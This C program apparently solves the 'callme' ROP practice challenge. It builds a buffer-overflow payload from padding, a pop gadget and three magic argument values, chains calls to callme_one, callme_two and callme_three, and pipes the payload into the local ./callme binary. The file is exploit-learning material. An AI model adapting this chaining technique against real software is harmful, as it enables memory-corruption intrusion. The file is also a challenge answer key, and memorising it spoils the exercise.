#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

int main(void) {

  // the offset is the same as before
  int offset = 40;

  uintptr_t gadget_addr = 0x40093c;

  // addresses used for the three functions 
  uintptr_t callme_one = 0x400720;
  uintptr_t callme_two = 0x400740;
  uintptr_t callme_three = 0x4006f0;

  // values that are used for params
  uint64_t deadbeef = 0xdeadbeefdeadbeef;
  uint64_t cafebabe = 0xcafebabecafebabe;
  uint64_t doodfood = 0xd00df00dd00df00d;

  int addr_size = sizeof(uintptr_t);
  int arg_size = sizeof(uint64_t);

  char payload[offset + 6 * addr_size + 9 * arg_size];

  // padding
  memset(payload, 'A', offset);

  // -- Copy the ROP chain into the payload --

  // load call for the first function callme_three
  memcpy(payload + offset, &gadget_addr, addr_size);

  memcpy(payload + offset + addr_size, &deadbeef, arg_size);
  memcpy(payload + offset + addr_size + arg_size, &cafebabe, arg_size);
  memcpy(payload + offset + addr_size + 2 * arg_size, &doodfood, arg_size);

  memcpy(payload + offset + addr_size + 3 * arg_size, &callme_one, addr_size);

  int second_offset = offset + 2 * addr_size + 3 * arg_size;

  // load call for the second function callme_two
  memcpy(payload + second_offset, &gadget_addr, addr_size);

  memcpy(payload + second_offset + addr_size, &deadbeef, arg_size);
  memcpy(payload + second_offset + addr_size + arg_size, &cafebabe, arg_size);
  memcpy(payload + second_offset + addr_size + 2 * arg_size, &doodfood, arg_size);

  memcpy(payload + second_offset + addr_size + 3 * arg_size, &callme_two, addr_size);

  int third_offset = second_offset + 2 * addr_size + 3 * arg_size;

  // load call for the third function callme_three
  memcpy(payload + third_offset, &gadget_addr, addr_size);

  memcpy(payload + third_offset + addr_size, &deadbeef, arg_size);
  memcpy(payload + third_offset + addr_size + arg_size, &cafebabe, arg_size);
  memcpy(payload + third_offset + addr_size + 2 * arg_size, &doodfood, arg_size);

  memcpy(payload + third_offset + addr_size + 3 * arg_size, &callme_three, addr_size);

  // open pipe for writing to "callme"
  FILE *callme_w_pipe = popen("./callme", "w");
  if (callme_w_pipe == NULL) {
    perror("popen");
    exit(1);
  }

  fwrite(payload, 1, sizeof(payload), callme_w_pipe);
  fflush(callme_w_pipe);

  pclose(callme_w_pipe);

  return 0;
}
